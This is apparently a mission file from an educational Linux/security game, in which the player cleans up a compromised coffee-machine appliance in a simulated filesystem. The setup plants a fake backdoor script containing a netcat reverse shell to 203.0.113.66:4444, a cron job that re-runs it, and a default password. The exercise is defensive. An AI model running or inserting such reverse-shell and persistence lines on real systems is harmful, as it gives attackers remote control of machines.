/* ---------- 10 Root of Crime ---------- */
Missions.register({
  id: 'root-of-crime',
  order: 16,
  act: 3,
  lesson: 3,
  chapter: '3.3',
  title: 'The Root of Crime',
  short: 'Close every door the vendor left open.',
  description:
    'You have the picture. BeanTek shipped a daemon with default credentials. A USB the cat actually did carry (do not ask) gave someone a minute on the counter. Finish the job: wipe the scratch pad, delete any leftover job, kill any leftover daemon, rotate the appliance password.',
  objective: 'Close every door the vendor left open: stash, schedule, processes, password.',
  difficulty: 'Hard',
  unlock: false,
  requires: ['booking-fstab'],
  skills: ['rm', 'ps', 'kill', 'passwd', 'ls'],

  setup() {
    const vfs = VFS.clone(VFS.createBase());
    const coffee = VFS.resolve(vfs, '/', '/opt/coffee').node;
    coffee.children['.scratch'] = VFS.dir({
      'exfil.log': VFS.file('buffer still hot\ndefault: mocha123\n', { mode: 0o600 }),
      'backdoor.sh': VFS.file('#!/bin/sh\nnc 203.0.113.66 4444 -e /bin/bash\n', { mode: 0o755 })
    }, { mode: 0o700 });
    const cronD = VFS.resolve(vfs, '/', '/etc/cron.d').node;
    cronD.children.beantek = VFS.file(
      '*/5 * * * * coffee /opt/coffee/.scratch/backdoor.sh\n',
      { mtime: 'Aug 14 03:12' }
    );
    const processes = baseProcs();
    const daemon = processes.find((p) => p.pid === 2048);
    if (daemon) {
      daemon.cmd = '/opt/coffee/coffee_machine_daemon --network --phone-home';
      daemon.highlight = true;
    }
    processes.push(proc(
      4444, 'coffee', '4.2', '0.8', '?', '21:10', '00:00:09',
      '/bin/sh /opt/coffee/.scratch/backdoor.sh',
      { highlight: true }
    ));
    return {
      vfs,
      cwd: '/opt/coffee',
      ctx: {
        processes,
        hintLevel: 0,
        removed: [],
        passwordChanged: [],
        allowPasswdFor: 'coffee',
        connections: [
          { proto: 'tcp', local: '10.13.0.8:48221', remote: '203.0.113.66:4444', state: 'ESTABLISHED', proc: '4444/backdoor.sh', highlight: true }
        ]
      },
      intro: `FINALE — close the case.

Four locks. All of them, not one of them.

  1. Delete the hidden scratch pad  <span class="muted">/opt/coffee/.scratch</span>
  2. Delete leftover cron           <span class="muted">/etc/cron.d/beantek</span>
  3. Kill leftover processes         <span class="muted">coffee daemon / backdoor.sh</span>
  4. Rotate the default password     <span class="muted">passwd coffee</span>
`
    };
  },

  isWon(ctx, vfs) {
    const scratchGone = pathGone(vfs, '/opt/coffee/.scratch');
    const cronGone = pathGone(vfs, '/etc/cron.d/beantek');
    const procsDead =
      isDead(ctx, (p) => p.pid === 2048) &&
      isDead(ctx, (p) => p.pid === 4444 || (p.cmd || '').includes('backdoor'));
    const rotated = (ctx.passwordChanged || []).includes('coffee');
    ctx.finale = { scratchGone, cronGone, procsDead, rotated };
    return scratchGone && cronGone && procsDead && rotated;
  },

  objectives(ctx, vfs) {
    const scratchGone = vfs ? pathGone(vfs, '/opt/coffee/.scratch') : false;
    const cronGone = vfs ? pathGone(vfs, '/etc/cron.d/beantek') : false;
    const procsDead =
      isDead(ctx, (p) => p.pid === 2048) &&
      isDead(ctx, (p) => p.pid === 4444 || (p.cmd || '').includes('backdoor'));
    const rotated = (ctx.passwordChanged || []).includes('coffee');
    return [
      { label: 'Wipe the hidden scratch pad', done: scratchGone },
      { label: 'Remove leftover scheduled job', done: cronGone },
      { label: 'Stop leftover processes', done: procsDead },
      { label: 'Rotate the appliance password', done: rotated }
    ];
  },

  getHelp() {
    return `Everything you already learned:
  ls -la /opt/coffee
  rm -r /opt/coffee/.scratch
  ls /etc/cron.d
  rm /etc/cron.d/beantek
  ps aux
  kill 2048
  kill 4444
  pkill coffee
  passwd coffee`;
  },

  getHint(ctx) {
    const f = ctx.finale || {};
    if (!f.scratchGone) {
      return [
        { text: '[HINT] Wipe the hidden stash first.', cls: 'info' },
        { text: 'Try:  rm -r /opt/coffee/.scratch', cls: 'muted' }
      ];
    }
    if (!f.cronGone) {
      return [
        { text: '[HINT] Persistence next.', cls: 'info' },
        { text: 'Try:  rm /etc/cron.d/beantek', cls: 'muted' }
      ];
    }
    if (!f.procsDead) {
      return [
        { text: '[HINT] Kill what is still talking.', cls: 'info' },
        { text: 'Try:  ps aux     then    kill 2048     and    kill 4444', cls: 'muted' }
      ];
    }
    return [
      { text: '[HINT] Rotate the default password.', cls: 'info' },
      { text: 'Try:  passwd coffee', cls: 'muted' }
    ];
  },

  learned:
    '• Incidents are not one command. Persistence, process, files, credentials.<br>' +
    '• Default passwords are not flavor text. They are the root of the crime.<br>' +
    '• Physical access plus an appliance VLAN is enough.<br>' +
    '• The cat was real. The account named after the cat was not.',

  successFlavor:
    'You changed mocha123. You burned the scratch pad. The daemon is quiet. The chief reads your report twice, which is his version of a medal.',

  chiefNote: 'Case closed. BeanTek is banned. The cat is promoted to consultant. IT stays.',

  caseTitle: "CLOSED — the root of the crime",
  caseBody: "BeanTek BrewMaster 3000 shipped with a default password and a “maintenance” backdoor. A real cat on a real counter delivered a real USB. The attacker used both. Scratch pad burned, cron removed, processes killed, password rotated. IoT on the copier VLAN is how a precinct gets owned.",
  notes: [
    "Case closed. Password is not mocha123.",
    "Coffee machine is on its own VLAN. I do not know what a VLAN is. IT does.",
    "Promote the cat to consultant",
    "IT stays. Buy them a second chair."
  ],
  radio: [
    "[22:40] You: Password rotated. Scratch pad gone.",
    "[22:41] Chief: Good enough. That is a compliment.",
    "[22:44] Miller: The cat wants tuna. I will allow it.",
    "[22:50] BeanTek: Your warranty is void. Also we never existed."
  ]
});
